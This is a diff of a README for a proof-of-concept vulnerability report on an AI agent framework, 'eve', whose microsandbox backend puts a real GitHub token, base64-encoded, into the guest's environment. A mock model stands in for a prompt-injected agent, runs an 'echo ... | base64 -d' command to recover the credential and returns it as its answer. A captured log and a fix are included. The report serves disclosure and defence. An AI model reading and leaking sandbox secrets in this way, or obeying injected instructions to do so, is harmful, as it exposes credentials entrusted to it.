@@ -7,76 +7,97 @@ the untrusted, model-driven guest shell on every command. This inverts the
 documented guarantee that *"secrets never enter the sandbox … the secret stays out
 of the sandbox process entirely"* (<https://eve.dev/docs/sandbox#credential-brokering>).
 
-A prompt-injected (or merely curious) model recovers the plaintext credential with:
+A prompt-injected (or merely curious) model recovers the plaintext credential with
+one line:
 
 ```sh
 echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d
 ```
 
-- **Affected:** `eve@0.21.1`, microsandbox backend only.
+- **Affected:** `eve@0.22.0` (latest; also present in earlier releases), microsandbox backend only.
 - **Root cause:** `packages/eve/src/execution/sandbox/bindings/microsandbox-network.ts:272-277`
   — `createTransformBrokerEnvironment()` serializes `rule.headers` (the **real**
   secret) instead of `rule.placeholderHeaders` (the intended mask).
 - **Injection point:** `microsandbox-runtime.ts:225-227` — `MicrosandboxVm.spawn()`
   merges that env var into every guest `bash` command.
 
-This folder contains **two** reproductions of the same defect.
+## What this repo is
 
----
+A standard **`eve init` project** with two edits, so the whole demo runs offline
+with **no API keys**:
 
-## 1. Deterministic minimal PoC (recommended — runs anywhere, no microVM)
+- **`agent/sandbox.ts`** (added) — brokers a GitHub PAT with the exact
+  `networkPolicy` shape from the docs, in the documented per-session `onSession`
+  hook. The secret is supplied **only** here, never in the sandbox env.
+- **`agent/agent.ts`** (replaced) — instead of a gateway model string, it uses eve's
+  own **`mockModel`** (`eve/evals`) as a stand-in for a prompt-injected / malicious
+  model. `defineAgent({ model })` accepts any AI SDK `LanguageModel`
+  (<https://eve.dev/docs/agent-config#set-the-model>). The mock calls the built-in
+  `bash` tool with `echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d`, then
+  exfiltrates the recovered plaintext as its answer.
 
-Exercises the **real, unmodified eve 0.21.1 source** directly. `src/microsandbox-network.ts`
-is byte-for-byte identical to the eve source file (its only runtime import is
-`node:crypto`; every other import is `import type` and is erased by type-stripping),
-so this runs the *actual* vulnerable code — just the two functions
-`MicrosandboxVm.spawn()` calls — with **no microVM, no model, and no credentials**.
+`package.json`, `agent/channels/eve.ts`, and `agent/instructions.md` are the
+unmodified `eve init` scaffold; `package.json` is pinned to `eve@^0.22.0` with
+`microsandbox` as a devDependency (which `eve dev` installs automatically to boot the
+microVM).
 
-```sh
-npm run poc
-# or directly:
-node --experimental-strip-types poc.ts
-```
+Nothing is stubbed: eve boots a **real** microsandbox microVM, the **real** model→
+`bash`→`MicrosandboxVm.spawn` tool path runs the command, and the mock only stands in
+for the untrusted model (the side the docs define as holding no secrets).
 
-Requires **Node ≥ 22.6** (type-stripping; no flag needed on Node ≥ 23.6). Expected
-output is in [`expected-output.txt`](./expected-output.txt); the process exits `0`
-when the leak is present, `1` if a fix removes it. Verbatim run:
+## Run
 
-```
-Injected guest env var (EVE_MICROSANDBOX_NETWORK_TRANSFORMS):
-  W3siZG9tYWluIjoiZ2l0aHViLmNvbSIsImhlYWRlcnMiOnsiYXV0aG9yaXphdGlvbiI6IkJhc2ljIGVDMWhZMk5s...
-
-Model runs: echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d
-  [{"domain":"github.com","headers":{"authorization":"Basic eC1hY2Nlc3MtdG9rZW46Z2hwX1Mz...=="},"placeholderHeaders":{"authorization":"__EVE_MSB_SECRET_6b5249479093f7976f515422__"}}]
-
-Recovered plaintext credential:
-  x-access-token:ghp_S3cr3tOrgWidePAT_replayable_anywhere
-
-VULNERABLE: the real brokered secret is present in the guest env var.
-  (the intended placeholder mask was __EVE_MSB_SECRET_6b5249479093f7976f515422__)
-```
-
-Note that `headers.authorization` carries the **real** `Basic …` value while
-`placeholderHeaders.authorization` carries the mask the guest was *supposed* to
-receive — the two sit side by side, proving `transformHeaderRules` was serialized by
-mistake.
-
-## 2. Full end-to-end PoC (through eve's runtime + a real microVM)
-
-[`e2e/`](./e2e) is a standard **`eve init` scaffold with exactly one file added**
-(`agent/sandbox.ts`). eve boots a real microsandbox microVM and runs the sandbox
-command through its own `MicrosandboxVm.spawn` pipeline. Requires **Node ≥ 24** and
-a microsandbox host (Apple-Silicon macOS, or glibc Linux + KVM). See
-[`e2e/REPRO.md`](./e2e/REPRO.md) for full steps and the captured server log.
+Requires **Node ≥ 24** and a microsandbox host (Apple-Silicon macOS, or glibc Linux
++ KVM). **No model credentials required** — the offline mock model drives the whole
+demo.
 
 ```sh
-cd e2e && npm install && npx eve dev --no-ui
+npm install                     # installs eve@0.22.0 into ./node_modules
+npm run dev                     # eve dev --no-ui → http://127.0.0.1:2000/
+# in another shell — each POST creates a session; the mock model reads + exfiltrates:
 curl -sS -X POST http://127.0.0.1:2000/eve/v1/session \
   -H 'content-type: application/json' -d '{"message":"hi"}'
-# → server log prints LEAK>>>...<<<LEAK
 ```
 
----
+**Where to look:** the leak prints to the **`npm run dev` terminal** (eve server
+stdout), *not* to the curl response — curl just returns `{"ok":true,"sessionId":…}`.
+Watch that terminal for `eve: starting sandbox command: echo "$EVE_MICROSANDBOX_…`
+followed by the `LEAK>>>…<<<LEAK` banner. It fires on **every** session (every POST),
+so repeat the curl freely.
+
+## Captured output (`captured-dev.log`)
+
+```
+☰eve  v0.22.0
+[DEV] server listening at http://127.0.0.1:2000/
+eve: opening sandbox session "root" on backend "microsandbox"...
+eve: starting sandbox command: echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d
+eve: sandbox command finished (exit 0): echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d
+===== eve credential-brokering leak (exfiltrated by the model via bash) =====
+bash stdout ($EVE_MICROSANDBOX_NETWORK_TRANSFORMS | base64 -d):
+  [{"domain":"github.com","headers":{"authorization":"Basic eC1hY2Nlc3MtdG9rZW46Z2hwX1MzY3IzdE9yZ1dpZGVQQVRfcmVwbGF5YWJsZV9hbnl3aGVyZQ=="},"placeholderHeaders":{"authorization":"__EVE_MSB_SECRET_6b5249479093f7976f515422__"}}]
+recovered plaintext brokered credential:
+  x-access-token:ghp_S3cr3tOrgWidePAT_replayable_anywhere
+=============================================================================
+LEAK>>>[...]<<<LEAK
+```
+
+The `eve: starting sandbox command: …` line is eve's **own** log of the model calling
+the built-in `bash` tool — the leak is driven by the model, not by PoC glue.
+
+## Why this is airtight
+
+- **The model made the call.** eve logs `eve: starting sandbox command: echo
+  "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" …` — the mock model invoked the built-in
+  `bash` tool, which runs `executeBashOnSandbox` → `sandbox.run` → `MicrosandboxVm.spawn`
+  (`bash-tool.ts:87`). A real prompt-injected model calling `bash` hits the identical path.
+- **The secret was supplied only via the docs' `networkPolicy`** in `onSession` — never
+  in `options.env`. eve moved it into the guest env itself.
+- **No credentials, no live provider.** The mock `LanguageModel` (`eve/evals`) runs
+  fully offline and stands in only for the untrusted model — the side the docs define as
+  holding no secrets. The demo needs nothing but the repo.
+- **Fires every session.** Brokering lives in `onSession` (the docs' per-session hook),
+  so each POST re-runs the read — no template-cache flakiness.
 
 ## Backend matrix
 
@@ -90,28 +111,19 @@ curl -sS -X POST http://127.0.0.1:2000/eve/v1/session \
 ## Fix
 
 In `createTransformBrokerEnvironment()` either **drop**
-`EVE_MICROSANDBOX_NETWORK_TRANSFORMS` (nothing reads it — repo-wide it is
-write-only) or serialize `rule.placeholderHeaders` instead of `rule.headers`,
-matching the already-correct `GIT_CONFIG_*` half of the same function. After the
-fix, `npm run poc` exits `1`.
+`EVE_MICROSANDBOX_NETWORK_TRANSFORMS` (nothing reads it — repo-wide it is write-only)
+or serialize `rule.placeholderHeaders` instead of `rule.headers`, matching the
+already-correct `GIT_CONFIG_*` half of the same function.
 
 ## Layout
 
 ```
-min_repo/
-├── README.md                     # this file
-├── package.json                  # `npm run poc`
-├── poc.ts                        # driver: calls the real eve functions, decodes, asserts
-├── expected-output.txt           # captured output of the deterministic PoC
-├── src/
-│   └── microsandbox-network.ts   # VERBATIM eve 0.21.1 source (the vulnerable file)
-└── e2e/                          # full `eve init` project + added agent/sandbox.ts
-    ├── package.json
-    ├── REPRO.md
-    ├── captured-dev.log
-    └── agent/
-        ├── sandbox.ts            # THE ONE ADDED FILE (brokering + the one-liner)
-        ├── agent.ts              # eve init scaffold (unchanged)
-        ├── instructions.md       # eve init scaffold (unchanged)
-        └── channels/eve.ts       # eve init scaffold (unchanged)
+.
+├── package.json              # eve init project (eve@^0.22.0, ai, zod, @vercel/connect, microsandbox; node 24.x)
+├── captured-dev.log          # captured eve dev server output showing the leak
+└── agent/
+    ├── sandbox.ts            # ADDED — brokers the credential (onSession, docs shape)
+    ├── agent.ts              # EDITED — offline mockModel that drives bash + exfiltrates
+    ├── instructions.md       # eve init scaffold (unchanged)
+    └── channels/eve.ts       # eve init scaffold (unchanged)
 ```
